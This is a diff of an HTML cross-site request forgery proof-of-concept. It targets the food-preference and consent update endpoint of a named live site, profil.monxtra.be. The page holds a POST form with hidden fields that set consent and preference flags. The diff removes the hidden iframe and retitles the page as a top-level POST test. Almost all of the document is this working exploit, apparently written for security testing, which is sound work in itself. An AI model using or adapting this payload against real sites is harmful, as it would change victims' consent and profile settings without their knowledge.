@@ -1,15 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CSRF PoC - Food Preference Update</title>
-</head>
 <body>
-  <h2>CSRF PoC - Update Food Preference</h2>
+  <h2>CSRF Test - Top Level POST</h2>
 
   <form
     action="https://profil.monxtra.be/manage-profile/food-preferences?type=consents&status=info&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2F_layout%2Findex"
     method="POST"
-    target="csrfFrame"
     enctype="application/x-www-form-urlencoded">
 
     <input type="hidden" name="hasAcceptedConsents" value="true">
@@ -18,11 +14,8 @@
     <input type="hidden" name="isLastPreference" value="false">
     <input type="hidden" name="shouldBecomeActive" value="true">
     <input type="hidden" name="isCurrentlyActive" value="true">
-    <input type="hidden" name="isLastPreference" value="false">
 
     <button type="submit">Submit CSRF</button>
   </form>
-
-  <iframe name="csrfFrame" style="display:none;"></iframe>
 </body>
 </html>
